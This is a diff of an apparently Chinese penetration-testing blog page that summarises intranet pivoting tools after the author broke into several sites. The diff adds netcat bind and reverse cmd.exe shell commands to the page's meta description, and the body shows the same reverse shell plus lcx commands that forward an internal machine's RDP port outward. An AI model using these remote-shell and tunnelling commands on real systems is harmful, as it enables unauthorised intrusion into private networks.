@@ -6,7 +6,17 @@
   <title>内网转发工具 | 小峰&#39;s Blog</title>
   <meta name="author" content="xiaofeng">
   
-  <meta name="description" content="这几天搞了几个站，生气！都是内网服务器，外网根本连不上内网，于是乎就只能上网搜内网转发工具的使用，索性就做一个总结，下载碰到这种情况，不至于盲目的谷歌。这次就介绍了nc、lcx、sSocket、tunna、reGeorg这几个好用平常用的又多的工具，当然网上写的也很好。0x01 nc反弹CMDshe">
+  <meta name="description" content="这几天搞了几个站，生气！都是内网服务器，外网根本连不上内网，于是乎就只能上网搜内网转发工具的使用，索性就做一个总结，下载碰到这种情况，不至于盲目的谷歌。这次就介绍了nc、lcx、sSocket、tunna、reGeorg这几个好用平常用的又多的工具，当然网上写的也很好。0x01 nc反弹CMDshell环境本机：192.168.1.2(win7) 远程机器：192.168.1.3(xp)正向连接：在远程机器上(t参数可以省略)
+nc -l -p 8888 -t -e cmd.exe
+在本地机器上
+nc -nvv 192.168.1.3 8888
+成功之后，本地机器就获得了一个远程机器的shell
+反向连接：在本机运行上
+nc -l -p 8888
+在远程机器上(t可省略)
+nc -t -e cmd.exe 192.168.1.2 8888
+然后成功之后，本地机器上已经获得了远程机器的cmdshell
+0x02 LCX转发">
   
   
   <meta name="viewport" content="width=device-width, initial-scale=1, maximum-scale=1">
@@ -76,7 +86,8 @@
 </code></pre><p>在远程机器上(t可省略)</p>
 <pre><code>nc -t -e cmd.exe 192.168.1.2 8888
 </code></pre><p>然后成功之后，本地机器上已经获得了远程机器的cmdshell</p>
-<h2 id="0x02-LCX转发"><a href="#0x02-LCX转发" class="headerlink" title="0x02 LCX转发"></a>0x02 LCX转发</h2><p>内网机器上执行</p>
+<h2 id="0x02-LCX转发"><a href="#0x02-LCX转发" class="headerlink" title="0x02 LCX转发"></a>0x02 LCX转发</h2><a id="more"></a>
+<p>内网机器上执行</p>
 <pre><code>lcx.exe –slave 192.168.1.3 8888 192.168.1.2 3389
 </code></pre><p>将内网的3389端口转发到公网的8888端口<br>然后在公网的上监听8888端口，转发3389端口</p>
 <pre><code>Lcx.exe –listen 8888 3389
